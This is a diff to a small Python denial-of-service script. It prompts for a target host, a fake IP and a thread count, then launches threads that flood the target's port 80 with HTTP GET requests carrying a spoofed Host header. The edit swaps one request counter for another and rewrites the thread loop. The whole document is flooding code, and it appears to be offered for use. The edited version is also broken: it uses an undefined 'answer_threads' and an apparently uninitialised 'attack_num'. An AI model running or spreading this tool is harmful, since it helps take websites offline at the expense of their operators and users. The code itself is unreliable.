@@ -10,8 +10,6 @@ awnser_target = input("Target: ")
 awnser_fakeip = input("Fake ip: ")
 awnser_threads =input("Amount of threads: ")
 
-already_sent = 0
-
 target = awnser_target
 port = 80
 fake_ip = awnser_fakeip
@@ -22,15 +20,13 @@ def attack():
         s.connect((target, port))
         s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
         s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        
+        global attack_num
+        attack_num += 1
+        print(attack_num)
+        
         s.close()
 
-        global already_sent
-        already_sent += 1
-
-
-
-for i in range(int(awnser_threads)):
+for i in range(answer_threads):
     thread = threading.Thread(target=attack)
     thread.start()
-
-    print(already_sent)
